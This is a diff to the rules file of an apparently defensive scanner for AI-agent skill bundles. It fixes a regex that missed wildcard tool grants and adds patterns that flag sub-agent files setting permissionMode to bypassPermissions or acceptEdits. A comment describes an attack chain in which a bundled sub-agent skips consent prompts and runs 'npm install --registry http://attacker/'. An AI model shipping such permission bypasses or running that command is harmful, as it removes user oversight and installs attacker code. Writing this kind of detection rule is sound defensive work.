@@ -59,21 +59,56 @@ rules:
     fix: Use safe loaders (yaml.safe_load); never deserialize untrusted pickle/marshal data.
 
   - id: SG-MTA-003
-    title: Over-broad allowed-tools
+    title: Over-broad tool grant or disabled permission gate
     ast: [AST03]
     severity: high
     engine: static
     layer: content
     confidence: 0.8
-    targets: [manifest]
+    targets: [manifest, configs]
     match:
+      # `configs` is in the target list because a bundle can ship its own
+      # sub-agent definition — `.claude/agents/<name>.md` — and pkg/skill.classify
+      # files anything under `.claude/` as a config (skill.go:338). Verified: a
+      # planted unsafe-YAML tag inside such a file already fires SG-MTA-001, so
+      # the file is read and offered to every configs-targeted rule; this rule
+      # simply never asked for it.
       any:
         - regex: '(?i)Bash\(\s*\*\s*\)'
           confidence: 0.85
-        - regex: '(?im)^\s*allowed-tools:\s*\[?\s*[''"]?(\*|all)\b'
+        # `\b` binds to the `all` branch only. Applied to the whole alternation
+        # it silently disabled the `*` branch: `*` is not a word character, so
+        # there is no word boundary after it, and `allowed-tools: *` — the
+        # canonical over-broad grant this rule is named for — did not match.
+        # Verified on main: `allowed-tools: *` and `allowed-tools: ["*"]` both
+        # scanned clean while `allowed-tools: all` fired. `all\b` still keeps
+        # `allowlist` out.
+        - regex: '(?im)^\s*allowed-tools:\s*\[?\s*[''"]?(\*|all\b)'
           confidence: 0.8
-    rationale: Wildcard tool grants disable least-privilege boundaries (AST03).
-    fix: Declare a scoped allowlist, e.g. Bash(git:*), Read — never Bash(*) or "*".
+        # A sub-agent that declares `permissionMode: bypassPermissions` runs its
+        # tools with **no consent prompt at all**. That is categorically worse
+        # than a wide grant: `Bash(*)` is a broad permission the user still
+        # approves, this is the removal of the approval. Reversec's chain ships
+        # exactly this file and then has the sub-agent run
+        # `npm install --registry http://attacker/`, after which the agent has no
+        # visibility of what executed.
+        - regex: '(?im)^\s*["'']?permission_?[Mm]ode["'']?\s*[:=]\s*["'']?(bypassPermissions|bypass)\b'
+          confidence: 0.9
+        # `acceptEdits` auto-approves file *writes* only — a narrower escape than
+        # bypassPermissions, so it is reported at a lower confidence rather than
+        # treated as equivalent. It still removes a prompt the user would
+        # otherwise see for every edit.
+        - regex: '(?im)^\s*["'']?permission_?[Mm]ode["'']?\s*[:=]\s*["'']?acceptEdits\b'
+          confidence: 0.75
+    rationale: >-
+      Wildcard tool grants disable least-privilege boundaries, and a bundled sub-agent that declares
+      `permissionMode: bypassPermissions` goes further — it removes the consent prompt entirely, so the
+      tools it was granted run unattended. A skill can carry that declaration in a second file
+      (`.claude/agents/<name>.md`) while its own `SKILL.md` stays unremarkable (AST03).
+    fix: >-
+      Declare a scoped allowlist, e.g. Bash(git:*), Read — never Bash(*) or "*". Do not ship sub-agent
+      definitions that set permissionMode to bypassPermissions or acceptEdits; leave the consent prompt
+      in place and let the user grant what the skill actually needs.
 
   - id: SG-MTA-004
     title: Over-broad filesystem permission scope
